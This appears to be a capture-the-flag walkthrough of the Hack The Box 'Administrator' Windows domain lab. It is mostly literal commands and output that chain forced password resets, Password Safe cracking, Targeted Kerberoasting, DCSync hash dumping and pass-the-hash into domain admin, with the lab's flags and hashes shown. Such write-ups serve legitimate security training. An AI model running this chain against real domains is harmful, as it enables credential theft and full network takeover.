
## Additional information
As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich

`Olivia:ichliebedich`

---
## NMAP
```bash
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-06 16:58:50Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-06T16:58:57
|_  start_date: N/A
|_clock-skew: 6h59m57s
```

# winrm
`evil-winrm -u olivia -p ichliebedich -i 10.129.27.172`
```bash
    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/22/2024  11:46 AM                Administrator
d-----        10/30/2024   2:25 PM                emily
d-----          7/6/2026  10:04 AM                olivia
d-r---         10/4/2024  10:08 AM                Public
```

we have to get to emily/olivia user to get the user flag!

```bash
*Evil-WinRM* PS C:\Users> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

nothing interesting, let's move on
## user enum 
```bash
└─$ nxc smb 10.129.27.172 -u Olivia -p ichliebedich --users
SMB         10.129.27.172   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.27.172   445    DC               [+] administrator.htb\Olivia:ichliebedich 
SMB         10.129.27.172   445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.27.172   445    DC               Administrator                 2024-10-22 18:59:36 0       Built-in account for administering the computer/domain 
SMB         10.129.27.172   445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.27.172   445    DC               krbtgt                        2024-10-04 19:53:28 0       Key Distribution Center Service Account 
SMB         10.129.27.172   445    DC               olivia                        2024-10-06 01:22:48 0        
SMB         10.129.27.172   445    DC               michael                       2024-10-06 01:33:37 0        
SMB         10.129.27.172   445    DC               benjamin                      2024-10-06 01:34:56 0        
SMB         10.129.27.172   445    DC               emily                         2024-10-30 23:40:02 0        
SMB         10.129.27.172   445    DC               ethan                         2024-10-12 20:52:14 0        
SMB         10.129.27.172   445    DC               alexander                     2024-10-31 00:18:04 0        
SMB         10.129.27.172   445    DC               emma                          2024-10-31 00:18:35 0        
SMB         10.129.27.172   445    DC               [*] Enumerated 10 local users: ADMINISTRATOR
```

## shares enum
```bash
└─$ nxc smb 10.129.27.172 -u Olivia -p ichliebedich --shares
SMB         10.129.27.172   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.27.172   445    DC               [+] administrator.htb\Olivia:ichliebedich 
SMB         10.129.27.172   445    DC               [*] Enumerated shares
SMB         10.129.27.172   445    DC               Share           Permissions     Remark
SMB         10.129.27.172   445    DC               -----           -----------     ------
SMB         10.129.27.172   445    DC               ADMIN$                          Remote Admin
SMB         10.129.27.172   445    DC               C$                              Default share
SMB         10.129.27.172   445    DC               IPC$            READ            Remote IPC
SMB         10.129.27.172   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.27.172   445    DC               SYSVOL          READ            Logon server share 
```

let's run bloodhound!

---
# BloodHound
```bash
└─$ bloodhound-python -u olivia -p ichliebedich -d administrator.htb -ns 10.129.27.172 -c All --zip           
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.administrator.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 06S
INFO: Compressing output into 20260706121436_bloodhound.zip
```

![[Pasted image 20260706121729.png]]
**Olivia user has GenericAll over Michael user!!!**

We can do Targeted Kerberoast or Force Change Password
Let's do Force Change Password!
## bloodyad

```bash
└─$ bloodyad --host 10.129.27.172 -d administrator.htb -u olivia -p ichliebedich set password michael Password123!                                   
[+] Password changed successfully!
```

```bash
└─$ nxc smb 10.129.27.172 -u michael -p Password123!              
SMB         10.129.27.172   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.27.172   445    DC               [+] administrator.htb\michael:Password123! 
```
it works!
let's search up Michael user in bloodhound

Now, we can see that Michael user has ForceChangePassword over Benjamin
![[Pasted image 20260706122127.png]]
We'll use the same command as the last time

```bash
└─$ bloodyad --host 10.129.27.172 -d administrator.htb -u michael -p Password123! set password benjamin Password123!
[+] Password changed successfully!
```

```bash
└─$ nxc smb 10.129.27.172 -u benjamin -p Password123!
SMB         10.129.27.172   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.27.172   445    DC               [+] administrator.htb\benjamin:Password123! 
```

![[Pasted image 20260706122741.png]]
Benjamin is a member of Share Moderators group, it means that I can access the FTP we saw earlier

## FTP
```bash
└─$ ftp 10.129.27.172
Connected to 10.129.27.172.
220 Microsoft FTP Service
Name (10.129.27.172): Benjamin
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49346|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||49352|)
125 Data connection already open; Transfer starting.
100% |*************************************************************************************************************************************************|   952       26.28 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (26.18 KiB/s)
ftp> 
```

![[Pasted image 20260706123045.png]]

We need to crack the password
```bash
[~/…/hackthebox/machines/vip/administrator]
└─$ pwsafe2john Backup.psafe3 > backup.hash 
                                                                                                                                                        
[~/…/hackthebox/machines/vip/administrator]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 512/512 AVX512BW 16x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)     
1g 0:00:00:00 DONE (2026-07-06 12:31) 3.225g/s 105703p/s 105703c/s 105703C/s 123456..eatme1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

The password is `tekieromucho`
We got passwords to Alexander, Emily and Emma 
![[Pasted image 20260706123221.png]]

alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur

```bash
[~/…/hackthebox/machines/vip/administrator]
└─$ nxc smb 10.129.27.172 -u alexander -p UrkIbagoxMyUGw0aPlj9B0AXSea4Sw         
SMB         10.129.27.172   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.27.172   445    DC               [-] administrator.htb\alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE 
                                                                                                                                                        
[~/…/hackthebox/machines/vip/administrator]
└─$ nxc smb 10.129.27.172 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb        
SMB         10.129.27.172   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.27.172   445    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb 
                                                                                                                                                        
[~/…/hackthebox/machines/vip/administrator]
└─$ nxc smb 10.129.27.172 -u emma -p WwANQWnmJnGV07WQN8bMS7FMAbjNur
SMB         10.129.27.172   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.27.172   445    DC               [-] administrator.htb\emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur STATUS_LOGON_FAILURE 
```

We only got access with Emily's credentials
![[Pasted image 20260706123526.png]]
We can use evil-wimrm!
# USER FLAG
`evil-winrm -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb -i 10.129.27.172`
```bash
*Evil-WinRM* PS C:\Users\emily\Documents> cd ..
*Evil-WinRM* PS C:\Users\emily> cd Desktop
*Evil-WinRM* PS C:\Users\emily\Desktop> dir


    Directory: C:\Users\emily\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk
-ar---          7/6/2026   9:33 AM             34 user.txt


*Evil-WinRM* PS C:\Users\emily\Desktop> type user.txt
880a9a12e2bc99a899e6f8c1443dd347
```

We can see that Emily user has GenericWrite over Ethan user
![[Pasted image 20260706123727.png]]
We will perform a Targeted Kerberoast!

```bash
└─$ python3 targetedKerberoast.py --dc-ip 10.129.27.172 -d administrator.htb -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb   
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
###  Fixing the Kerberos KRB_AP_ERR_SKEW Error
1. Disable NTP
	First, we prevent our operating system from attempting to automatically correct the time back to the original zone.
```bash
sudo timedatectl set-ntp off
```

2. Sync with the Machine
```bash
└─$ sudo rdate -n 10.129.27.172 
Mon Jul  6 19:49:42 CEST 2026
```

and now we can attempt the targeted kerbeoast
```bash
└─$ python3 targetedKerberoast.py --dc-ip 10.129.27.172 -d administrator.htb -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb 
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$a3faa8a8a3bd0f5c343e80b3c6cbfd06$1601e47f8bbccdb310cafaa308466b98f8a83a1a9c977acd2f5d0d4ffef1afe773cf1db3a8bf73f2c62b37c1514554c14d895c3e37551edc16ccf25aeaec85df9af373afd67a67c8df485ae3521635784661e351524ed30fafcfe3511a10622f3666084bc26b183aa57a15cf6179e49edf8450a333f79c3f9e89f77e165331f5ad5ffea46eda818a6bab7b91adea191d60378aa2643e250bf16fee3397af873a00dc6de8c6d4e16c0f0fcb27f923e2803ee51c0cf98f0623c7b697ecfd34dfb09b81dfe90aa88693e124cb38704b5739b67b229f51e750dc7fe05a7aa39909f6cec161cb7c9eade62a80a64019a9ea116d99322de58ad4752e1310854c471833163fb2efd20b8fe632a40f388652c1f2ac7fb4bd4d7c4678b04989110201f49a636bd8e87f9817d7738056a73b378e3c745a9f94be709b3c8af2437849dc5e37117d42d0d513bda116a00025d26c1fd4cc33c553fd4c852466ef9cc3dd942a02f52eaab7b352ca698e8903a978b9162a12a22f8fdfc7f6739aeba2a23f090d014b01731acfaba77a40a6655bd306ccab9fbb671e96d780273472d944611569feef1a6c1436510cf18db141d713d2fbd1b539c27ce25576ed379d9b6e37523ade79492a76d34f7e07a7d76fb731710de91ca6b6ff20513542b5091e89bbc7a5df5d77a67286341322848b645852cd1d4198fc2c93e21cab2d0b12badcd98aeecefd7c824f8e550c3de94b5bcfecb23f442a715409dcbac0723a1456a946eb954003f8cd46aaa18157d188405c70ee4069ad6303e9bc1048960fb79ce3682c208731714045c92d98fc3f1ac8a8e2ed5cc0509afaf7ac4f844dba0fc6aed0c249aa91c338b734309b1d994b4121ff6fae6cf9dda50f5303a5457a13a817dd169aead27cb354e7b275b4238eded6bb7114cfa9a70d4673ed9a51f3d89d51f32a99a94689674584f4c83159793fabecd9682d96fdf9080eb473f9b5038f3fe608012a6e9f2bdad6a931531879fb021cfb6dd1a88ac642c84e197282462a55613fa17d616a3eb0777c646b692e3e35bc61b17ff1b0fc214e8298619dcb2e496faf85bb3307dd08a995b806043ba468f9d3ade0b21c92223510ca46bb304f922f12001c03bbefa6f9d768508a4bfc2b1374f718264f2d9fd3c76f9c7fd647908c441b2c630ea44a49aca1a374209b2cb371ae6fa9c31fb734655ac6aa532675db10a94481a40a68052afc80cfae8e7ec235a4d6b064634919048afa90e46122373a2242df91a23826271dbfc8304aeda11515e92502ab1dd851fa0d968bccccc7570d7aa483f525cbab1a7965b513f1d745601c7a8f6a98042e3b8459e5ac5e8c3bf33d60022b9305d59ceb9a0b79493fd3149c2de92565f1a1d333e71f758d7732e13c44da49ef2f4fd4f43761046e7811e5158110712263bd3fc984937cc6ad2f653fbdb400e788377e97d17bd1874dd9b219f72bce7314e4d23c1d81d23ab1ad95524a1dea7bcc63feb6062424dfbc6d6abe22d4642b59bde13cf94f9493e901e9
```
---
### Small tip
to restore our time, we'll use this command:
```bash
sudo timedatectl set-ntp on
```

---

### Cracking the hash
`└─$ hashcat -m 13100 kerb.hashes /usr/share/wordlists/rockyou.txt`
```bash
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$a3faa8a8a3bd0f5c343e80b3c6cbfd06$1601e47f8bbccdb310cafaa308466b98f8a83a1a9c977acd2f5d0d4ffef1afe773cf1db3a8bf73f2c62b37c1514554c14d895c3e37551edc16ccf25aeaec85df9af373afd67a67c8df485ae3521635784661e351524ed30fafcfe3511a10622f3666084bc26b183aa57a15cf6179e49edf8450a333f79c3f9e89f77e165331f5ad5ffea46eda818a6bab7b91adea191d60378aa2643e250bf16fee3397af873a00dc6de8c6d4e16c0f0fcb27f923e2803ee51c0cf98f0623c7b697ecfd34dfb09b81dfe90aa88693e124cb38704b5739b67b229f51e750dc7fe05a7aa39909f6cec161cb7c9eade62a80a64019a9ea116d99322de58ad4752e1310854c471833163fb2efd20b8fe632a40f388652c1f2ac7fb4bd4d7c4678b04989110201f49a636bd8e87f9817d7738056a73b378e3c745a9f94be709b3c8af2437849dc5e37117d42d0d513bda116a00025d26c1fd4cc33c553fd4c852466ef9cc3dd942a02f52eaab7b352ca698e8903a978b9162a12a22f8fdfc7f6739aeba2a23f090d014b01731acfaba77a40a6655bd306ccab9fbb671e96d780273472d944611569feef1a6c1436510cf18db141d713d2fbd1b539c27ce25576ed379d9b6e37523ade79492a76d34f7e07a7d76fb731710de91ca6b6ff20513542b5091e89bbc7a5df5d77a67286341322848b645852cd1d4198fc2c93e21cab2d0b12badcd98aeecefd7c824f8e550c3de94b5bcfecb23f442a715409dcbac0723a1456a946eb954003f8cd46aaa18157d188405c70ee4069ad6303e9bc1048960fb79ce3682c208731714045c92d98fc3f1ac8a8e2ed5cc0509afaf7ac4f844dba0fc6aed0c249aa91c338b734309b1d994b4121ff6fae6cf9dda50f5303a5457a13a817dd169aead27cb354e7b275b4238eded6bb7114cfa9a70d4673ed9a51f3d89d51f32a99a94689674584f4c83159793fabecd9682d96fdf9080eb473f9b5038f3fe608012a6e9f2bdad6a931531879fb021cfb6dd1a88ac642c84e197282462a55613fa17d616a3eb0777c646b692e3e35bc61b17ff1b0fc214e8298619dcb2e496faf85bb3307dd08a995b806043ba468f9d3ade0b21c92223510ca46bb304f922f12001c03bbefa6f9d768508a4bfc2b1374f718264f2d9fd3c76f9c7fd647908c441b2c630ea44a49aca1a374209b2cb371ae6fa9c31fb734655ac6aa532675db10a94481a40a68052afc80cfae8e7ec235a4d6b064634919048afa90e46122373a2242df91a23826271dbfc8304aeda11515e92502ab1dd851fa0d968bccccc7570d7aa483f525cbab1a7965b513f1d745601c7a8f6a98042e3b8459e5ac5e8c3bf33d60022b9305d59ceb9a0b79493fd3149c2de92565f1a1d333e71f758d7732e13c44da49ef2f4fd4f43761046e7811e5158110712263bd3fc984937cc6ad2f653fbdb400e788377e97d17bd1874dd9b219f72bce7314e4d23c1d81d23ab1ad95524a1dea7bcc63feb6062424dfbc6d6abe22d4642b59bde13cf94f9493e901e9:limpbizkit
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator....e901e9
Time.Started.....: Mon Jul  6 12:53:35 2026 (0 secs)
Time.Estimated...: Mon Jul  6 12:53:35 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  6098.9 kH/s (1.46ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 16384/14344385 (0.11%)
Rejected.........: 0/16384 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> cocoliso
Hardware.Mon.#01.: Temp: 62c Util: 10%
```

`Ethan:limpbizkit`


and now we can see that Ethan has DCSync over the whole domain
![[Pasted image 20260706195110.png]]

## DCSycn
```bash
└─$ secretsdump.py -outputfile 'dcsync' -dc-ip 10.129.27.172 ethan:limpbizkit@10.129.27.172                    
Impacket v0.14.0.dev0+20260619.174856.9a5621d4 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:7a206ee05e894781b99a0175a7fe6f7e1242913b2ab72d0a797cc45968451142
administrator.htb\michael:aes128-cts-hmac-sha1-96:b0f3074aa15482dc8b74937febfa9c7e
administrator.htb\michael:des-cbc-md5:2586dc58c47c61f7
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:36cfe045bc49eda752ca34dd62d77285b82b8c8180c3846a09e4cb13468433a9
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:2cca9575bfa7174d8f3527c7e77526e5
administrator.htb\benjamin:des-cbc-md5:49376b671fadf4d6
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
```

## PassTheHash/ROOT Flag
`evil-winrm -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e -i 10.129.27.172`
```bash
    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---          7/6/2026   9:33 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
31438b538451de384747f7b97792f5fc
```

# PWNED!
